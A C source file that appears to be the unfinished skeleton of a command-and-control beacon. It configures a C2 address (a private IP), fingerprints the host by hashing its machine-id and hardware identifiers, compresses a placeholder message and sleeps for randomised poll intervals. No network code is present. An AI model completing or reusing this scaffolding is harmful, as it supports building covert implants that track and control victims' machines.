#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <zlib.h>
#include <stdint.h>
#include <inttypes.h>

struct Config {
    struct in_addr c2_ip;
    int minimum_poll_seconds;
    int maximum_poll_seconds;
    int compression_level;
};

uint64_t get_device_id(){

	const char *paths[] = {
		"/etc/machine-id",
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor"
	};

	uint64_t id = UINT64_C(14695981039346656037);

	for (int i = 0; i < 3; i++) {

		FILE *f = fopen(paths[i], "r");
		int character;
		while ((character = fgetc(f)) != EOF) {
			if (character == '\n' || character == '\r') {
				continue;
			}
			id ^= (unsigned char)character;
			id *= UINT64_C(1099511628211);
		}
		fclose(f);

		id ^= 255;
		id *= UINT64_C(1099511628211);
	}

	return id;

}

int main() {

	struct Config configuration = {
		.minimum_poll_seconds = 1,
		.maximum_poll_seconds = 3,
		.compression_level = 6
	};

	inet_pton(AF_INET, "192.168.67.20", &configuration.c2_ip);
	srand((int)time(NULL) ^ (int)getpid());

	const unsigned char message[] = "abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz";
	uLong message_length = sizeof(message) - 1;
	uLongf compressed_length = compressBound(message_length);
	unsigned char *compressed_data = malloc(compressed_length);
	
	compress2(compressed_data, &compressed_length, message, message_length, configuration.compression_level);


	for (int i = configuration.minimum_poll_seconds; i <= configuration.maximum_poll_seconds; i++) {

		int delay_before_next_poll = configuration.minimum_poll_seconds + (int)rand() % (configuration.maximum_poll_seconds - configuration.minimum_poll_seconds + 1);





		sleep(delay_before_next_poll);

	}

    return 0;
}

